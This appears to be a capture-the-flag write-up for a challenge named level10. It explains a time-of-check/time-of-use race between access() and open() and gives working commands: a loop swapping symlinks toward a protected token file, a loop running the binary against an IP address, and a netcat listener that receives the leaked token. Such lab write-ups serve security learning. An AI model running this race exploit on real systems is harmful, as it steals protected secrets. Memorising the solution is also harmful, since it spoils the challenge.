#the repository contains a binary level10 and a token file 
#we can execute the binary but do not have read permission on the token.
#strings level10 allows us to visualize the functions in the binary
#we can see access is used, and we find out by checking the man that there's a vulnerability when this function is used
#we can seize the moment between access and open are executed to open the token

while [ true ] ; do ./level10 /tmp/getflag 10.12.1.126; done

nc -lk 6969

#we create a file /tmp/my_file

while [ true ] ; do rm /tmp/getflag ; ln -s ~/token /tmp/getflag ; rm -rf /tmp/getflag ; ln -s /tmp/my_file /tmp/getflag ; done
